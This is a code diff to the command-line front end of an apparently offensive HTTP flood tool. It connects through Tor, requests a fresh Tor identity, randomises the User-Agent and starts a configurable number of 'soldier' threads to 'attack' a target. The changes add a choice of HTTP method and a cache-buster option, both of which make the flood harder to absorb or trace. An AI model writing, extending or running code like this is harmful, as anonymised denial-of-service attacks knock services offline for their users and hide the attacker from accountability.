@@ -10,18 +10,20 @@ import signal
 import sys
 
 
-class BFDCLI:
+class CLI:
 
     def __init__(
             self,
             tor_address='127.0.0.1',
             tor_proxy_port=9050,
             tor_ctrl_port=9051,
-            num_soldiers=10
+            num_soldiers=10,
+            http_method='GET',
+            cache_buster=False
         ):
         """
 
-        :param max_threads: Maximum of threads to spin up for the attack
+        :param num_soldiers: Maximum of solider threads to spin up for the attack
         """
 
         self._tor_address = tor_address
@@ -30,6 +32,9 @@ class BFDCLI:
 
         self._platoon = None  # app.command.Platoon
         self._num_soldiers = num_soldiers
+
+        self._http_method = str(http_method).upper()
+        self._cache_buster = cache_buster
 
         self._register_sig_handler()
 
@@ -41,11 +46,14 @@ class BFDCLI:
 
         try:
 
-            self._connect()
+            self._init()
 
             app.console.system("running singleshot")
 
-            weapon_factory = SingleShotFactory()
+            weapon_factory = SingleShotFactory(
+                http_method=self._http_method,
+                cache_buster=self._cache_buster
+            )
 
             self._platoon.attack(
                 weapon_factory=weapon_factory,
@@ -59,10 +67,7 @@ class BFDCLI:
         self._shutdown()
 
 
-    def _connect(self):
-        """
-        Connect to the TOR server
-        """
+    def _init(self):
 
         app.console.system("connecting to TOR; %s (proxy %d) (ctrl %d)" % (
             self._tor_address,
@@ -80,17 +85,16 @@ class BFDCLI:
         app.tor.new_ident()
 
         ourip = app.net.lookupip()
-        app.console.system("identity on TOR; %s" % ourip)
+        app.console.system("TOR IP; %s" % ourip)
 
-        app.console.system("creating thread platoon with %d soldiers" % self._num_soldiers)
+        app.net.new_user_agent()
+        app.console.system("User-Agent; %s" % app.net.get_user_agent())
+
         self._platoon = Platoon(
             num_soldiers=self._num_soldiers
         )
 
     def _shutdown(self):
-        """
-        Shutdown
-        """
 
         app.console.system("shutting down")
 
@@ -105,9 +109,9 @@ class BFDCLI:
 
     def _signal_handler(self, sig, frame):
 
-        app.console.log("signal received, holding fire")
+        app.console.system("signal received, holding fire")
         self._platoon.hold_fire()
 
 
 if __name__ == '__main__':
-    fire.Fire(BFDCLI)
+    fire.Fire(CLI)
